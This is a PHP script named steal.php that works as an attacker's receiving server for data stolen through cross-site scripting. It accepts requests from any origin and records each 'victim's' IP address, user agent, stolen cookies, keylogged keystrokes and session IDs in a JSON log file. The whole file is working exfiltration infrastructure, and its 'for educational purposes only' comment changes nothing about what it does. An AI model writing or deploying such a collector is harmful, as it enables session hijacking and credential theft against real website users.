<?php
// steal.php - Simplified version without permission issues
// FOR EDUCATIONAL PURPOSES ONLY!
error_reporting(E_ALL);
ini_set('display_errors', 1);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

$response = ['status' => 'error', 'message' => 'No data received'];

try {
    // USE A SIMPLE FILE - no subfolders
    $logFile = 'victims_log.json';
    
    // Collect data
    $victimData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
        'method' => $_SERVER['REQUEST_METHOD'],
        'victim_id' => 'victim_' . uniqid()
    ];
    
    // GET data
    if (!empty($_GET)) {
        $victimData['get_data'] = $_GET;
        
        // Special handling for common XSS parameters
        if (isset($_GET['cookie'])) {
            $victimData['stolen_data']['cookies'] = $_GET['cookie'];
        }
        if (isset($_GET['key'])) {
            $victimData['stolen_data']['keylog'] = $_GET['key'];
        }
        if (isset($_GET['session'])) {
            $victimData['stolen_data']['sessionId'] = $_GET['session'];
        }
    }
    
    // POST data
    if (!empty($_POST)) {
        $victimData['post_data'] = $_POST;
        
        // Handle form data
        if (isset($_POST['session_id'])) {
            $victimData['stolen_data']['sessionId'] = $_POST['session_id'];
        }
    }
    
    // Raw input for JSON
    $rawInput = file_get_contents('php://input');
    if (!empty($rawInput)) {
        $victimData['raw_input'] = $rawInput;
        $jsonData = json_decode($rawInput, true);
        if ($jsonData) {
            $victimData['stolen_data'] = array_merge($victimData['stolen_data'] ?? [], $jsonData);
        }
    }
    
    // Load existing data
    $existingData = [];
    if (file_exists($logFile)) {
        $content = file_get_contents($logFile);
        $existingData = json_decode($content, true) ?: [];
    }
    
    // Add new victim
    $existingData[] = $victimData;
    
    // Keep only last 100 victims to prevent file from growing too large
    if (count($existingData) > 100) {
        $existingData = array_slice($existingData, -100);
    }
    
    // Save (same directory as steal.php)
    if (file_put_contents($logFile, json_encode($existingData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
        $response = [
            'status' => 'success',
            'message' => 'Data saved successfully!',
            'victim_id' => $victimData['victim_id'],
            'total_victims' => count($existingData),
            'file_location' => $logFile
        ];
    } else {
        $response['message'] = 'Failed to save to file';
    }
    
} catch (Exception $e) {
    $response['message'] = 'Error: ' . $e->getMessage();
}

// Debug info
$response['debug'] = [
    'method' => $_SERVER['REQUEST_METHOD'],
    'timestamp' => date('Y-m-d H:i:s'),
    'file_writable' => is_writable('.'),
    'current_dir' => getcwd(),
    'received_data' => [
        'get_count' => count($_GET),
        'post_count' => count($_POST),
        'raw_input_length' => strlen(file_get_contents('php://input'))
    ]
];

echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>